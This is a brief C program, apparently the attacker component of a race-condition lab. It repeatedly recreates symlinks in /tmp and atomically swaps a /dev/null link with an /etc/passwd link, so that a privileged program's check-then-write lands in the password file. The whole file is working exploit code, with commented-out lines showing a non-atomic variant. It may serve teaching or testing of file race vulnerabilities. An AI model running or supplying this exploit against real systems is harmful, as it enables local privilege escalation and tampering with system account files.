#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

int main() {
	unsigned int flags = RENAME_EXCHANGE;

	while(1) {
		unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
		unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
		renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
		usleep(1000);
		
		//unlink("/tmp/XYZ");
		//symlink("/dev/null", "/tmp/XYZ");
		//usleep(1000);

		//unlink("/tmp/XYZ");
		//symlink("/etc/passwd", "/tmp/XYZ");
		//usleep(1000);
	}
	return 0;
}
